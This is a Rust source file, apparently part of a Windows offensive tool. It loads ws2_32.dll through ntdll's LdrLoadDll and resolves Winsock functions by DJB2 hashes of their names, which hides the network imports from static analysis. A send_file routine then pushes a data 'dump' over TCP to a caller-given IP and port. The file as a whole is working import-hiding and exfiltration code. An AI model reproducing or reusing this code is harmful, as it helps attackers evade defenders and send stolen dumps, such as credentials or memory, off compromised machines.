#[cfg(feature = "verbose")]
use libc_print::libc_println;

use alloc::ffi::CString;
use alloc::vec::Vec;

use core::{
    ffi::c_void,
    mem::{transmute, zeroed},
    ptr::{null, null_mut},
    sync::atomic::{AtomicBool, Ordering},
};

use crate::common::ldrapi::ldr_function;
use crate::ntapi::def::UnicodeString;
use crate::ntapi::g_instance::instance;

use crate::debug_println;

// Data structures for Winsock
#[repr(C)]
pub struct WsaData {
    pub w_version: u16,
    pub w_high_version: u16,
    pub sz_description: [i8; 257],
    pub sz_system_status: [i8; 129],
    pub i_max_sockets: u16,
    pub i_max_udp_dg: u16,
    pub lp_vendor_info: *mut i8,
}

#[repr(C)]
pub struct SockAddrIn {
    pub sin_family: u16,
    pub sin_port: u16,
    pub sin_addr: InAddr,
    pub sin_zero: [i8; 8],
}

#[repr(C)]
pub struct InAddr {
    pub s_addr: u32,
}

#[repr(C)]
pub struct SockAddr {
    pub sa_family: u16,
    pub sa_data: [i8; 14],
}

#[repr(C)]
pub struct AddrInfo {
    pub ai_flags: i32,
    pub ai_family: i32,
    pub ai_socktype: i32,
    pub ai_protocol: i32,
    pub ai_addrlen: u32,
    pub ai_canonname: *mut i8,
    pub ai_addr: *mut SockAddr,
    pub ai_next: *mut AddrInfo,
}

// Define function types for Winsock functions
type WSAStartupFunc =
    unsafe extern "system" fn(wVersionRequested: u16, lpWsaData: *mut WsaData) -> i32;
type WSACleanupFunc = unsafe extern "system" fn() -> i32;
type SocketFunc = unsafe extern "system" fn(af: i32, socket_type: i32, protocol: i32) -> SOCKET;
type ConnectFunc = unsafe extern "system" fn(s: SOCKET, name: *const SockAddr, namelen: i32) -> i32;
type SendFunc = unsafe extern "system" fn(s: SOCKET, buf: *const i8, len: i32, flags: i32) -> i32;
type RecvFunc = unsafe extern "system" fn(s: SOCKET, buf: *mut i8, len: i32, flags: i32) -> i32;
type ClosesocketFunc = unsafe extern "system" fn(s: SOCKET) -> i32;
type InetAddrFunc = unsafe extern "system" fn(cp: *const i8) -> u32;
type HtonsFunc = unsafe extern "system" fn(hostshort: u16) -> u16;
type GetAddrInfoFunc = unsafe extern "system" fn(
    node: *const i8,
    service: *const i8,
    hints: *const AddrInfo,
    res: *mut *mut AddrInfo,
) -> i32;
type FreeAddrInfoFunc = unsafe extern "system" fn(res: *mut AddrInfo);

type WSAGetLastError = unsafe extern "system" fn() -> i32;

// Structure to hold function pointers
pub struct Winsock {
    pub wsa_startup: WSAStartupFunc,
    pub wsa_cleanup: WSACleanupFunc,
    pub socket: SocketFunc,
    pub connect: ConnectFunc,
    pub send: SendFunc,
    pub recv: RecvFunc,
    pub closesocket: ClosesocketFunc,
    pub inet_addr: InetAddrFunc,
    pub htons: HtonsFunc,
    pub getaddrinfo: GetAddrInfoFunc,
    pub freeaddrinfo: FreeAddrInfoFunc,
    pub wsa_get_last_error: WSAGetLastError,
}

impl Winsock {
    // Function to initialize the Winsock structure with null values
    pub fn new() -> Self {
        Winsock {
            wsa_startup: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            wsa_cleanup: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            socket: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            connect: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            send: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            recv: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            closesocket: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            inet_addr: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            htons: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            getaddrinfo: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            freeaddrinfo: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            wsa_get_last_error: unsafe {
                core::mem::transmute(core::ptr::null::<core::ffi::c_void>())
            },
        }
    }
}

// Global variable to store Winsock functions
static mut WINSOCK_FUNCS: Option<Winsock> = None;
// Atomic variable to track if Winsock functions have been initialized
static INIT_WINSOCKS: AtomicBool = AtomicBool::new(false);

/// Initializes Winsock functions.
///
/// This function dynamically loads the Winsock functions from the "ws2_32.dll" library.
/// It ensures that the functions are loaded only once using atomic operations.
/// The function does not return any values.
pub fn init_winsock_funcs() {
    unsafe {
        if !INIT_WINSOCKS.load(Ordering::Acquire) {
            // Constants representing hash values of Winsock function names
            pub const WSA_STARTUP_DBJ2: usize = 0x142e89c3;
            pub const WSA_CLEANUP_DBJ2: usize = 0x32206eb8;
            pub const SOCKET_DBJ2: usize = 0xcf36c66e;
            pub const CONNECT_DBJ2: usize = 0xe73478ef;
            pub const SEND_DBJ2: usize = 0x7c8bc2cf;
            pub const RECV_DBJ2: usize = 0x7c8b3515;
            pub const CLOSESOCKET_DBJ2: usize = 0x185953a4;
            pub const INET_ADDR_DBJ2: usize = 0xafe73c2f;
            pub const HTONS_DBJ2: usize = 0xd454eb1;
            pub const GETADDRINFO_DBJ2: usize = 0x4b91706c;
            pub const FREEADDRINFO_DBJ2: usize = 0x307204e;
            pub const WSAGETLASTERROR_H: usize = 0x9c1d912e;

            let dll_name = "ws2_32.dll";
            let mut ws2_win32_dll_unicode = UnicodeString::new();
            let utf16_string: Vec<u16> = dll_name.encode_utf16().chain(Some(0)).collect();
            ws2_win32_dll_unicode.init(utf16_string.as_ptr());

            let mut ws2_win32_handle: *mut c_void = null_mut();

            (instance().ntdll.ldr_load_dll)(
                null_mut(),
                null_mut(),
                ws2_win32_dll_unicode,
                &mut ws2_win32_handle as *mut _ as *mut c_void,
            );

            if ws2_win32_handle.is_null() {
                return;
            }

            let ws2_32_module = ws2_win32_handle as *mut u8;

            // Resolve function addresses using hashed names
            let wsa_startup_addr = ldr_function(ws2_32_module, WSA_STARTUP_DBJ2);
            let wsa_cleanup_addr = ldr_function(ws2_32_module, WSA_CLEANUP_DBJ2);
            let socket_addr = ldr_function(ws2_32_module, SOCKET_DBJ2);
            let connect_addr = ldr_function(ws2_32_module, CONNECT_DBJ2);
            let send_addr = ldr_function(ws2_32_module, SEND_DBJ2);
            let recv_addr = ldr_function(ws2_32_module, RECV_DBJ2);
            let closesocket_addr = ldr_function(ws2_32_module, CLOSESOCKET_DBJ2);
            let inet_addr_addr = ldr_function(ws2_32_module, INET_ADDR_DBJ2);
            let htons_addr = ldr_function(ws2_32_module, HTONS_DBJ2);
            let getaddrinfo_addr = ldr_function(ws2_32_module, GETADDRINFO_DBJ2);
            let freeaddrinfo_addr = ldr_function(ws2_32_module, FREEADDRINFO_DBJ2);
            let wsa_get_last_error_addr = ldr_function(ws2_32_module, WSAGETLASTERROR_H);

            // Initialize Winsock functions
            let mut winsock_functions = Winsock::new();
            winsock_functions.wsa_startup = transmute(wsa_startup_addr);
            winsock_functions.wsa_cleanup = transmute(wsa_cleanup_addr);
            winsock_functions.socket = transmute(socket_addr);
            winsock_functions.connect = transmute(connect_addr);
            winsock_functions.send = transmute(send_addr);
            winsock_functions.recv = transmute(recv_addr);
            winsock_functions.closesocket = transmute(closesocket_addr);
            winsock_functions.inet_addr = transmute(inet_addr_addr);
            winsock_functions.htons = transmute(htons_addr);
            winsock_functions.getaddrinfo = transmute(getaddrinfo_addr);
            winsock_functions.freeaddrinfo = transmute(freeaddrinfo_addr);
            winsock_functions.wsa_get_last_error = transmute(wsa_get_last_error_addr);

            // Store the functions in the global variable
            WINSOCK_FUNCS = Some(winsock_functions);

            // Mark Winsock functions as initialized
            INIT_WINSOCKS.store(true, Ordering::Release);
        }
    }
}

/// Gets the Winsock functions.
///
/// This function ensures the Winsock functions are initialized and returns a reference to them.
/// If the functions are not already initialized, it will initialize them first.
///
/// # Returns
/// * `&'static Winsock` - A reference to the initialized Winsock functions.
pub fn get_winsock() -> &'static Winsock {
    init_winsock_funcs();
    return unsafe { WINSOCK_FUNCS.as_ref().unwrap() };
}

#[allow(non_camel_case_types)]
pub type SOCKET = usize;

/// Cleans up the Winsock library.
///
/// This function cleans up the Winsock library, releasing any resources that were allocated.
/// This function does not return any values.
pub fn cleanup_winsock(sock: SOCKET) {
    unsafe {
        (get_winsock().closesocket)(sock);
        (get_winsock().wsa_cleanup)();
    }
}

/// Initializes the Winsock library for network operations on Windows.
/// Returns 0 on success, or the error code on failure.
pub fn init_winsock() -> i32 {
    unsafe {
        let mut wsa_data: WsaData = core::mem::zeroed();
        let result = (get_winsock().wsa_startup)(0x0202, &mut wsa_data);
        if result != 0 {
            return (get_winsock().wsa_get_last_error)();
        }
        result
    }
}

/// Creates a new TCP socket for network communication.
/// Returns the socket descriptor (SOCKET) or an error code on failure.
pub fn create_socket() -> SOCKET {
    unsafe {
        (get_winsock().socket)(2, 1, 6) // AF_INET, SOCK_STREAM, IPPROTO_TCP
    }
}

/// Resolves a hostname to an IPv4 address.
/// Returns the IPv4 address as a `u32` or an error code on failure.
pub fn resolve_hostname(hostname: &str) -> u32 {
    unsafe {
        let hostname_cstr = CString::new(hostname).unwrap();
        let mut hints: AddrInfo = zeroed();
        hints.ai_family = 2; // AF_INET
        hints.ai_socktype = 1; // SOCK_STREAM
        let mut res: *mut AddrInfo = null_mut();

        let status = (get_winsock().getaddrinfo)(hostname_cstr.as_ptr(), null(), &hints, &mut res);

        if status != 0 {
            return (get_winsock().wsa_get_last_error)() as u32;
        }

        let mut ip_addr: u32 = 0;
        let mut addr_info_ptr = res;

        while !addr_info_ptr.is_null() {
            let addr_info = &*addr_info_ptr;
            if addr_info.ai_family == 2 {
                // AF_INET
                let sockaddr_in = &*(addr_info.ai_addr as *const SockAddrIn);
                ip_addr = sockaddr_in.sin_addr.s_addr;
                break;
            }
            addr_info_ptr = addr_info.ai_next;
        }

        (get_winsock().freeaddrinfo)(res);
        ip_addr
    }
}

/// Connects a socket to a given address and port.
/// Returns 0 on success, or the error code on failure.
pub fn connect_socket(sock: SOCKET, addr: &str, port: u16) -> i32 {
    unsafe {
        let addr = if addr == "localhost" {
            "127.0.0.1"
        } else {
            addr
        };

        let resolve_addr = resolve_hostname(addr);
        let mut sockaddr_in: SockAddrIn = core::mem::zeroed();
        sockaddr_in.sin_family = 2; // AF_INET
        sockaddr_in.sin_port = (get_winsock().htons)(port);
        sockaddr_in.sin_addr.s_addr = resolve_addr;

        let sockaddr = &sockaddr_in as *const _ as *const SockAddr;
        let result =
            (get_winsock().connect)(sock, sockaddr, core::mem::size_of::<SockAddrIn>() as i32);

        if result != 0 {
            return (get_winsock().wsa_get_last_error)();
        }
        result
    }
}

/// Sends a request through a socket.
///
/// This function sends a request through the specified socket.
/// It returns a `Result` indicating whether the send operation was successful or not.
///
/// # Arguments
/// * `sock` - The socket descriptor.
/// * `request` - The request data to be sent.
pub fn send_request(sock: SOCKET, request: &[u8]) -> i32 {
    unsafe {
        let result =
            (get_winsock().send)(sock, request.as_ptr() as *const i8, request.len() as i32, 0);
        if result != 0 {
            return (get_winsock().wsa_get_last_error)();
        }
        result
    }
}

/// Sends a Vec<u8> to a remote address and port via socket.
///
/// # Arguments
/// * `data` - The data to be sent as a Vec<u8>.
/// * `ip` - The remote IP address as a string (e.g., "127.0.0.1").
/// * `port` - The port to connect to.
pub fn send_file(data: Vec<u8>, ip: &str, port: u16) {
    // Initialize Winsock.
    let wsa_init_result = init_winsock();
    if wsa_init_result != 0 {
        debug_println!(
            "[-] Failed to initialize Winsock with error: {}",
            wsa_init_result
        );
        return;
    }

    // Create a socket.
    let sock = create_socket();
    if sock == usize::MAX {
        unsafe {
            let _error = (get_winsock().wsa_get_last_error)();
            debug_println!("[-] Failed to create socket. Winsock error: {}", _error);
            return;
        }
    }

    // Connect the socket to the IP and port.
    let connect_result = connect_socket(sock, ip, port);
    if connect_result != 0 {
        debug_println!(
            "[-] Failed to connect socket to {}:{} with error: {}",
            ip,
            port,
            connect_result
        );
        cleanup_winsock(sock);
        return;
    }

    // Send the data.
    let send_result = send_request(sock, &data);

    // Check if sending the file was successful.
    if send_result != 0 {
        debug_println!(
            "[-] Failed to send data to {}:{} with error: {}",
            ip,
            port,
            send_result
        );
        cleanup_winsock(sock);
        return;
    }

    // Close the socket.
    cleanup_winsock(sock);

    debug_println!("[+] Dump sent successfully to remote host");
}
